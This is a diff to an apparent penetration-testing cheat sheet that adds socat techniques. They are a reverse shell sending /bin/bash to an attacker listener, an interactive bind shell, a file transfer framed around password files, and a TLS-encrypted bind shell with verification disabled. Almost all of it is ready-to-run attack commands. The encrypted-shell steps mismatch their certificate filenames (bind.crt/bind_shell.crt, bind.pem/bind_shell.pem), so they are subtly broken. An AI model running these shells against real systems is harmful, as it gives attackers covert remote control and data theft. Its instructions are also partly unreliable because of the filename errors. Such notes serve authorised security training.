@@ -148,17 +148,72 @@ $ webshells
 ## Socat
 
 * Socat is not well know but is super useful if able to launch
-* Once launche socat can provide a fully interactive shell just like SSH
+* Once launched socat can provide a fully interactive shell just like SSH
 
-Here is bind shell example:
+### socat reverse shell
 
+```bash
+
+#attacker
+socat -d -d TCP4-LISTEN:443 STDOUT
+
+#victim
+socat TCP4:10.xxx.xxx.xxx:443 EXEC:/bin/bash
 ```
+
+### Fully interactive bind shell
+
+```bash
 #On Victim with IP address 10.99.66.88 initiate a listener:
 socat exec:'bash -li',pty,stderr,setsid,sigint,sane TCP4-LISTEN:3333,reuseaddr,fork,ignoreeof
 
 #from attacker
 socat file:`tty`,raw,echo=0 tcp:10.99.66.88:3333
 ```
+
+### Socat file transfers
+
+```bash
+
+# sender: attacker on linux
+
+sudo socat TCP4-LISTEN:443,fork file:secret_passwords.txt
+
+# receiver: victim on windows
+socat TCP4:10.11.0.4:443 file:received_secret_passwords.txt,create
+
+```
+
+### Encrypted connection
+
+1. Create self-signed cert in openssl
+
+```bash
+- req: initiate a new certificate signing request
+- newkey: generate a new private key
+- rsa:2048: use RSA encryption with a 2,048-bit key length.
+- nodes: store the private key without passphrase protection
+- keyout: save the key to a file
+- x509: output a self-signed certificate instead of a certificate request
+- days: set validity period in days
+- out: save the certificate to a file
+
+openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind.crt
+
+#converting to .pem
+cat bind_shell.key bind_shell.crt > bind_shell.pem
+
+# victim
+
+sudo socat OPENSSL-LISTEN:443,cert=bind.pem,verify=0,fork EXEC:/bin/bash
+
+# verify=0 to disable certificate verification
+
+# attacker connects
+socat - OPENSSL:10.xxx.xxx.xxx:443,verify=0
+
+```
+
 
 ## Webshell
 
